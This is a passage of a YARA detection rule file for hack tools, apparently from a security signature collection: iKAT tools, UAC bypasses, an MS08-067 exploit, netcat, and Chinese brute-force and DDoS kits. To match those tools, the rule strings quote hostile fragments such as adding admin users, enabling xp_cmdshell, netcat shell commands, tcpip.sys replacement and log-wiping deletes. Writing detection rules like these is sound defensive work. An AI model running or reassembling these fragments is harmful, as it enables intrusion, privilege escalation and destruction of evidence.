= \"This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 65\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"97c4d4e6a644eed5aa12437805e39213e494d120\"\n\tstrings:\n\t\t$s0 = \"This operating system is not supported.\" fullword ascii\n\t\t$s1 = \"Error!\" fullword ascii\n\t\t$s2 = \"Win32 only!\" fullword ascii\n\t\t$s3 = \"COMCTL32.dll\" fullword ascii\n\t\t$s4 = \"[LordPE]\" ascii\n\t\t$s5 = \"CRTDLL.dll\" fullword ascii\n\t\t$s6 = \"VBScript\" fullword ascii\n\t\t$s7 = \"CoUninitialize\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 15KB\n}\n\nrule iKAT_revelations {\n\tmeta:\n\t\tdescription = \"iKAT hack tool showing the content of password fields - file revelations.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"c4e217a8f2a2433297961561c5926cbd522f7996\"\n\tstrings:\n\t\t$s0 = \"The RevelationHelper.DLL file is corrupt or missing.\" fullword ascii\n\t\t$s8 = \"BETAsupport@snadboy.com\" fullword wide\n\t\t$s9 = \"support@snadboy.com\" fullword wide\n\t\t$s14 = \"RevelationHelper.dll\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule iKAT_priv_esc_tasksch {\n\tmeta:\n\t\tdescription = \"Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista.\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"84ab94bff7abf10ffe4446ff280f071f9702cf8b\"\n\tstrings:\n\t\t$s0 = \"objShell.Run \\\"schtasks /change /TN wDw00t /disable\\\",,True\" fullword ascii\n\t\t$s3 = \"objShell.Run \\\"schtasks /run /TN wDw00t\\\",,True\" fullword ascii\n\t\t$s4 = \"'objShell.Run \\\"cmd /c copy C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t .\\\",,True\" fullword ascii\n\t\t$s6 = \"a.WriteLine (\\\"schtasks /delete /f /TN wDw00t\\\")\" fullword ascii\n\t\t$s7 = \"a.WriteLine (\\\"net user /add ikat ikat\\\")\" fullword ascii\n\t\t$s8 = \"a.WriteLine (\\\"cmd.exe\\\")\" fullword ascii\n\t\t$s9 = \"strFileName=\\\"C:\\\\windows\\\\system32\\\\tasks\\\\wDw00t\\\"\" fullword ascii\n\t\t$s10 = \"For n = 1 To (Len (hexXML) - 1) step 2\" fullword ascii\n\t\t$s13 = \"output.writeline \\\" Should work on Vista/Win7/2008 x86/x64\\\"\" fullword ascii\n\t\t$s11 = \"Set objExecObject = objShell.Exec(\\\"cmd /c schtasks /query /XML /TN wDw00t\\\")\" fullword ascii\n\t\t$s12 = \"objShell.Run \\\"schtasks /create /TN wDw00t /sc monthly /tr \\\"\\\"\\\"+biatchFile+\\\"\" ascii\n\t\t$s14 = \"a.WriteLine (\\\"net localgroup administrators /add v4l\\\")\" fullword ascii\n\t\t$s20 = \"Set ts = fso.createtextfile (\\\"wDw00t.xml\\\")\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule iKAT_command_lines_agent {\n\tmeta:\n\t\tdescription = \"iKAT hack tools set agent - file ikat.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 75\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"c802ee1e49c0eae2a3fc22d2e82589d857f96d94\"\n\tstrings:\n\t\t$s0 = \"Extended Module: super mario brothers\" fullword ascii\n\t\t$s1 = \"Extended Module: \" fullword ascii\n\t\t$s3 = \"ofpurenostalgicfeeling\" fullword ascii\n\t\t$s8 = \"-supermariobrotheretic\" fullword ascii\n\t\t$s9 = \"!http://132.147.96.202:80\" fullword ascii\n\t\t$s12 = \"iKAT Exe Template\" fullword ascii\n\t\t$s15 = \"withadancyflavour..\" fullword ascii\n\t\t$s16 = \"FastTracker v2.00   \" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule iKAT_cmd_as_dll {\n\tmeta:\n\t\tdescription = \"iKAT toolset file cmd.dll ReactOS file cloaked\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 65\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"b5d0ba941efbc3b5c97fe70f70c14b2050b8336a\"\n\tstrings:\n\t\t$s1 = \"cmd.exe\" fullword wide\n\t\t$s2 = \"ReactOS Development Team\" fullword wide\n\t\t$s3 = \"ReactOS Command Processor\" fullword wide\n\n\t\t$ext = \"extension: .dll\" nocase\n\tcondition:\n\t\tall of ($s*) and $ext\n}\n\nrule iKAT_tools_nmap {\n\tmeta:\n\t\tdescription = \"Generic rule for NMAP - based on NMAP 4 standalone\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 50\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"d0543f365df61e6ebb5e345943577cc40fca8682\"\n\tstrings:\n\t\t$s0 = \"Insecure.Org\" fullword wide\n\t\t$s1 = \"Copyright (c) Insecure.Com\" fullword wide\n\t\t$s2 = \"nmap\" fullword nocase\n\t\t$s3 = \"Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule iKAT_startbar {\n\tmeta:\n\t\tdescription = \"Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 50\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\thash = \"0cac59b80b5427a8780168e1b85c540efffaf74f\"\n\tstrings:\n\t\t$s2 = \"Shinysoft Limited1\" fullword ascii\n\t\t$s3 = \"Shinysoft Limited0\" fullword ascii\n\t\t$s4 = \"Wellington1\" fullword ascii\n\t\t$s6 = \"Wainuiomata1\" fullword ascii\n\t\t$s8 = \"56 Wright St1\" fullword ascii\n\t\t$s9 = \"UTN-USERFirst-Object\" fullword ascii\n\t\t$s10 = \"New Zealand1\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {\n\tmeta:\n\t\tdescription = \"iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\tsuper_rule = 1\n\t\thash0 = \"814c126f21bc5e993499f0c4e15b280bf7c1c77f\"\n\t\thash1 = \"2725690954c2ad61f5443eb9eec5bd16ab320014\"\n\t\thash2 = \"75f5aed1e719443a710b70f2004f34b2fe30f2a9\"\n\t\thash3 = \"b65a460d015fd94830d55e8eeaf6222321e12349\"\n\t\tscore = 20\n\tstrings:\n\t\t$s0 = \"Failed to get temp file for source AES decryption\" fullword\n\t\t$s5 = \"Failed to get encryption header for pwd-protect\" fullword\n\t\t$s17 = \"Failed to get filetime\" fullword\n\t\t$s20 = \"Failed to delete temp file for password decoding (3)\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule iKAT_Tool_Generic {\n\tmeta:\n\t\tdescription = \"Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"05.11.14\"\n\t\tscore = 55\n\t\treference = \"http://ikat.ha.cked.net/Windows/functions/ikatfiles.html\"\n\t\tsuper_rule = 1\n\t\thash0 = \"814c126f21bc5e993499f0c4e15b280bf7c1c77f\"\n\t\thash1 = \"75f5aed1e719443a710b70f2004f34b2fe30f2a9\"\n\t\thash2 = \"b65a460d015fd94830d55e8eeaf6222321e12349\"\n\tstrings:\n\t\t$s0 = \"<IconFile>C:\\\\WINDOWS\\\\App.ico</IconFile>\" fullword\n\t\t$s1 = \"Failed to read the entire file\" fullword\n\t\t$s4 = \"<VersionCreatedBy>14.4.0</VersionCreatedBy>\" fullword\n\t\t$s8 = \"<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P\"\n\t\t$s9 = \"Running Zip pipeline...\" fullword\n\t\t$s10 = \"<FinTitle />\" fullword\n\t\t$s12 = \"<AutoTemp>0</AutoTemp>\" fullword\n\t\t$s14 = \"<DefaultDir>%TEMP%</DefaultDir>\" fullword\n\t\t$s15 = \"AES Encrypting...\" fullword\n\t\t$s20 = \"<UnzipDir>%TEMP%</UnzipDir>\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule BypassUac2 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUac2.zip\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"ef3e7dd2d1384ecec1a37254303959a43695df61\"\n\tstrings:\n\t\t$s0 = \"/BypassUac/BypassUac/BypassUac_Utils.cpp\" fullword ascii\n\t\t$s1 = \"/BypassUac/BypassUacDll/BypassUacDll.aps\" fullword ascii\n\t\t$s3 = \"/BypassUac/BypassUac/BypassUac.ico\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule BypassUac_3 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.dll\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"1974aacd0ed987119999735cad8413031115ce35\"\n\tstrings:\n\t\t$s0 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s1 = \"\\\\Release\\\\BypassUacDll\" ascii\n\t\t$s3 = \"Win7ElevateDLL\" fullword wide\n\t\t$s7 = \"BypassUacDLL\" fullword wide\n\tcondition:\n\t\t3 of them\n}\n\nrule BypassUac_9 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUac.zip\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"93c2375b2e4f75fc780553600fbdfd3cb344e69d\"\n\tstrings:\n\t\t$s0 = \"/x86/BypassUac.exe\" fullword ascii\n\t\t$s1 = \"/x64/BypassUac.exe\" fullword ascii\n\t\t$s2 = \"/x86/BypassUacDll.dll\" fullword ascii\n\t\t$s3 = \"/x64/BypassUacDll.dll\" fullword ascii\n\t\t$s15 = \"BypassUac\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule BypassUacDll_6 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s3 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule BypassUacDll_7 {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s3 = \"BypassUacDLL.dll\" fullword wide\n\t\t$s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule BypassUac_EXE {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file BypassUacDll.aps\"\n\t\tauthor = \"yarGen Yara Rule Generator\"\n\t\thash = \"58d7b24b6870cb7f1ec4807d2f77dd984077e531\"\n\tstrings:\n\t\t$s1 = \"Wole32.dll\" wide\n\t\t$s3 = \"System32\\\\migwiz\" wide\n\t\t$s4 = \"System32\\\\migwiz\\\\CRYPTBASE.dll\" wide\n\t\t$s5 = \"Elevation:Administrator!new:\" wide\n\t\t$s6 = \"BypassUac\" wide\n\tcondition:\n\t\tall of them\n}\n\nrule APT_Proxy_Malware_Packed_dev\n{\n\tmeta:\n\t\tauthor = \"FRoth\"\n\t\tdate = \"2014-11-10\"\n\t\tdescription = \"APT Malware - Proxy\"\n\t\thash = \"6b6a86ceeab64a6cb273debfa82aec58\"\n\t\tscore = 50\n\tstrings:\n\t\t$string0 = \"PECompact2\" fullword\n\t\t$string1 = \"[LordPE]\"\n\t\t$string2 = \"steam_ker.dll\"\n\tcondition:\n\t\tall of them\n}\n\nrule Tzddos_DDoS_Tool_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tzddos\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d4c517eda5458247edae59309453e0ae7d812f8e\"\n\tstrings:\n\t\t$s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n\t\t$s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n\t\t$s2 = \"del host.txt /q\" fullword ascii\n\t\t$s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n\t\t$s4 = \"start Http.exe %%a %http%\" fullword ascii\n\t\t$s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n\t\t$s6 = \"del Result.txt s2.txt s1.txt \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Ncat_Hacktools_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file nc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"001c0c01c96fa56216159f83f6f298755366e528\"\n\tstrings:\n\t\t$s0 = \"nc -l -p port [options] [hostname] [port]\" fullword ascii\n\t\t$s2 = \"nc [-options] hostname port[s] [ports] ... \" fullword ascii\n\t\t$s3 = \"gethostpoop fuxored\" fullword ascii\n\t\t$s6 = \"VERNOTSUPPORTED\" fullword ascii\n\t\t$s7 = \"%s [%s] %d (%s)\" fullword ascii\n\t\t$s12 = \" `--%s' doesn't allow an argument\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule MS08_067_Exploit_Hacktools_CN {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file cs.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a3e9e0655447494253a1a60dbc763d9661181322\"\n\tstrings:\n\t\t$s0 = \"MS08-067 Exploit for CN by EMM@ph4nt0m.org\" fullword ascii\n\t\t$s3 = \"Make SMB Connection error:%d\" fullword ascii\n\t\t$s5 = \"Send Payload Over!\" fullword ascii\n\t\t$s7 = \"Maybe Patched!\" fullword ascii\n\t\t$s8 = \"RpcExceptionCode() = %u\" fullword ascii\n\t\t$s11 = \"ph4nt0m\" fullword wide\n\t\t$s12 = \"\\\\\\\\%s\\\\IPC\" ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule Hacktools_CN_Burst_sql {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file sql.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d5139b865e99b7a276af7ae11b14096adb928245\"\n\tstrings:\n\t\t$s0 = \"s.exe %s %s %s %s %d /save\" fullword ascii\n\t\t$s2 = \"s.exe start error...%d\" fullword ascii\n\t\t$s4 = \"EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'\" fullword ascii\n\t\t$s7 = \"EXEC master..xp_cmdshell 'wscript.exe cc.js'\" fullword ascii\n\t\t$s10 = \"Result.txt\" fullword ascii\n\t\t$s11 = \"Usage:sql.exe [options]\" fullword ascii\n\t\t$s17 = \"%s root %s %d error\" fullword ascii\n\t\t$s18 = \"Pass.txt\" fullword ascii\n\t\t$s20 = \"SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\\\\\sillyr_x.so' FROM sillyr_x\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule Hacktools_CN_Panda_445TOOL {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file 445TOOL.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"92050ba43029f914696289598cf3b18e34457a11\"\n\tstrings:\n\t\t$s0 = \"scan.bat\" fullword ascii\n\t\t$s1 = \"Http.exe\" fullword ascii\n\t\t$s2 = \"GOGOGO.bat\" fullword ascii\n\t\t$s3 = \"ip.txt\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_Panda_445 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file 445.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a61316578bcbde66f39d88e7fc113c134b5b966b\"\n\tstrings:\n\t\t$s0 = \"for /f %%i in (ips.txt) do (start cmd.bat %%i)\" fullword ascii\n\t\t$s1 = \"445\\\\nc.exe\" fullword ascii\n\t\t$s2 = \"445\\\\s.exe\" fullword ascii\n\t\t$s3 = \"cs.exe %1\" fullword ascii\n\t\t$s4 = \"445\\\\cs.exe\" fullword ascii\n\t\t$s5 = \"445\\\\ip.txt\" fullword ascii\n\t\t$s6 = \"445\\\\cmd.bat\" fullword ascii\n\t\t$s9 = \"@echo off\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_WinEggDrop {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file s.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"7665011742ce01f57e8dc0a85d35ec556035145d\"\n\tstrings:\n\t\t$s0 = \"Normal Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n\t\t$s2 = \"SYN Scan: About To Scan %u IP For %u Ports Using %d Thread\" fullword ascii\n\t\t$s6 = \"Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner\" fullword ascii\n\t\t$s8 = \"Something Wrong About The Ports\" fullword ascii\n\t\t$s9 = \"Performing Time: %d/%d/%d %d:%d:%d --> \" fullword ascii\n\t\t$s10 = \"Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save\" fullword ascii\n\t\t$s12 = \"%u Ports Scanned.Taking %d Threads \" fullword ascii\n\t\t$s13 = \"%-16s %-5d -> \\\"%s\\\"\" fullword ascii\n\t\t$s14 = \"SYN Scan Can Only Perform On WIN 2K Or Above\" fullword ascii\n\t\t$s17 = \"SYN Scan: About To Scan %s:%d Using %d Thread\" fullword ascii\n\t\t$s18 = \"Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule Hacktools_CN_Scan_BAT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file scan.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"6517d7c245f1300e42f7354b0fe5d9666e5ce52a\"\n\tstrings:\n\t\t$s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n\t\t$s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n\t\t$s2 = \"del host.txt /q\" fullword ascii\n\t\t$s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n\t\t$s4 = \"start Http.exe %%a %http%\" fullword ascii\n\t\t$s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule Hacktools_CN_Panda_Burst {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Burst.rar\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"ce8e3d95f89fb887d284015ff2953dbdb1f16776\"\n\tstrings:\n\t\t$s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr.\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_445_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file cmd.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"69b105a3aec3234819868c1a913772c40c6b727a\"\n\tstrings:\n\t\t$bat = \"@echo off\" fullword ascii\n\t\t$s0 = \"cs.exe %1\" fullword ascii\n\t\t$s2 = \"nc %1 4444\" fullword ascii\n\tcondition:\n\t\t$bat at 0 and all of ($s*)\n}\n\nrule Hacktools_CN_GOGOGO_Bat {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file GOGOGO.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"4bd4f5b070acf7fe70460d7eefb3623366074bbd\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"delims=\\\" %%x in (endend.txt) do call :lisoob %%x\" fullword ascii\n\t\t$s1 = \"http://www.tzddos.com/ -------------------------------------------->byebye.txt\" fullword ascii\n\t\t$s2 = \"ren %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n\t\t$s4 = \"IF /I \\\"%wangle%\\\"==\\\"\\\" ( goto start ) else ( goto erromm )\" fullword ascii\n\t\t$s5 = \"copy *.tzddos scan.bat&del *.tzddos\" fullword ascii\n\t\t$s6 = \"del /f tcpip.sys\" fullword ascii\n\t\t$s9 = \"if /i \\\"%CB%\\\"==\\\"www.tzddos.com\\\" ( goto mmbat ) else ( goto wangle )\" fullword ascii\n\t\t$s10 = \"call scan.bat\" fullword ascii\n\t\t$s12 = \"IF /I \\\"%erromm%\\\"==\\\"\\\" ( goto start ) else ( goto zuihoujh )\" fullword ascii\n\t\t$s13 = \"IF /I \\\"%zuihoujh%\\\"==\\\"\\\" ( goto start ) else ( goto laji )\" fullword ascii\n\t\t$s18 = \"sc config LmHosts start= auto\" fullword ascii\n\t\t$s19 = \"copy tcpip.sys %systemroot%\\\\system32\\\\drivers\\\\tcpip.sys > nul\" fullword ascii\n\t\t$s20 = \"ren %systemroot%\\\\system32\\\\dllcache\\\\tcpip.sys tcpip.sys.bak\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule Hacktools_CN_Burst_pass {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file pass.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"55a05cf93dbd274355d798534be471dff26803f9\"\n\tstrings:\n\t\t$s0 = \"123456.com\" fullword ascii\n\t\t$s1 = \"123123.com\" fullword ascii\n\t\t$s2 = \"360.com\" fullword ascii\n\t\t$s3 = \"123.com\" fullword ascii\n\t\t$s4 = \"juso.com\" fullword ascii\n\t\t$s5 = \"sina.com\" fullword ascii\n\t\t$s7 = \"changeme\" fullword ascii\n\t\t$s8 = \"master\" fullword ascii\n\t\t$s9 = \"google.com\" fullword ascii\n\t\t$s10 = \"chinanet\" fullword ascii\n\t\t$s12 = \"lionking\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_JoHor_Posts_Killer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file JoHor_Posts_Killer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d157f9a76f9d72dba020887d7b861a05f2e56b6a\"\n\tstrings:\n\t\t$s0 = \"Multithreading Posts_Send Killer\" fullword ascii\n\t\t$s3 = \"GET [Access Point] HTTP/1.1\" fullword ascii\n\t\t$s6 = \"The program's need files was not exist!\" fullword ascii\n\t\t$s7 = \"JoHor_Posts_Killer\" fullword wide\n\t\t$s8 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n\t\t$s10 = \"  ( /s ) :\" fullword ascii\n\t\t$s11 = \"forms.vbp\" fullword ascii\n\t\t$s12 = \"forms.vcp\" fullword ascii\n\t\t$s13 = \"Software\\\\FlySky\\\\E\\\\Install\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule Hacktools_CN_Panda_tesksd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tesksd.jpg\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb\"\n\tstrings:\n\t\t$s0 = \"name=\\\"Microsoft.Windows.Common-Controls\\\" \" fullword ascii\n\t\t$s1 = \"ExeMiniDownload.exe\" fullword wide\n\t\t$s16 = \"POST %Hs\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_Http {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Http.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"788bf0fdb2f15e0c628da7056b4e7b1a66340338\"\n\tstrings:\n\t\t$s0 = \"RPCRT4.DLL\" fullword ascii\n\t\t$s1 = \"WNetAddConnection2A\" fullword ascii\n\t\t$s2 = \"NdrPointerBufferSize\" fullword ascii\n\t\t$s3 = \"_controlfp\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 10KB\n}\n\nrule Hacktools_CN_Burst_Start {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Start.bat - DoS tool\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"75d194d53ccc37a68286d246f2a84af6b070e30c\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"eol= tokens=1,2 delims= \\\" %%i in (ip.txt) do (\" fullword ascii\n\t\t$s1 = \"Blast.bat /r 600\" fullword ascii\n\t\t$s2 = \"Blast.bat /l Blast.bat\" fullword ascii\n\t\t$s3 = \"Blast.bat /c 600\" fullword ascii\n\t\t$s4 = \"start Clear.bat\" fullword ascii\n\t\t$s5 = \"del Result.txt\" fullword ascii\n\t\t$s6 = \"s syn %%i %%j 3306 /save\" fullword ascii\n\t\t$s7 = \"start Thecard.bat\" fullword ascii\n\t\t$s10 = \"setlocal enabledelayedexpansion\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule Hacktools_CN_Panda_tasksvr {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tasksvr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a73fc74086c8bb583b1e3dcfd326e7a383007dc0\"\n\tstrings:\n\t\t$s2 = \"Consys21.dll\" fullword ascii\n\t\t$s4 = \"360EntCall.exe\" fullword wide\n\t\t$s15 = \"Beijing1\" fullword ascii\n\tcondition:\n\t\tall of them\n}\nrule Hacktools_CN_Burst_Clear {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Clear.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"148c574a4e6e661aeadaf3a4c9eafa92a00b68e4\"\n\tstrings:\n\t\t$s0 = \"del /f /s /q %systemdrive%\\\\*.log    \" fullword ascii\n\t\t$s1 = \"del /f /s /q %windir%\\\\*.bak    \" fullword ascii\n\t\t$s4 = \"del /f /s /q %systemdrive%\\\\*.chk    \" fullword ascii\n\t\t$s5 = \"del /f /s /q %systemdrive%\\\\*.tmp    \" fullword ascii\n\t\t$s8 = \"del /f /q %userprofile%\\\\COOKIES s\\\\*.*    \" fullword ascii\n\t\t$s9 = \"rd /s /q %windir%\\\\temp & md %windir%\\\\temp    \" fullword ascii\n\t\t$s11 = \"del /f /s /q %systemdrive%\\\\recycled\\\\*.*    \" fullword ascii\n\t\t$s12 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temp\\\\*.*\\\"    \" fullword ascii\n\t\t$s19 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temporary Internet Files\\\\*.*\\\"   \" ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule Hacktools_CN_Burst_Thecard {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Thecard.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"50b01ea0bfa5ded855b19b024d39a3d632bacb4c\"\n\tstrings:\n\t\t$s0 = \"tasklist |find \\\"Clear.bat\\\"||start Clear.bat\" fullword ascii\n\t\t$s1 = \"Http://www.coffeewl.com\" fullword ascii\n\t\t$s2 = \"ping -n 2 localhost 1>nul 2>nul\" fullword ascii\n\t\t$s3 = \"for /L %%a in (\" fullword ascii\n\t\t$s4 = \"MODE con: COLS=42 lines=5\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Hacktools_CN_Burst_Blast {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Blast.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = 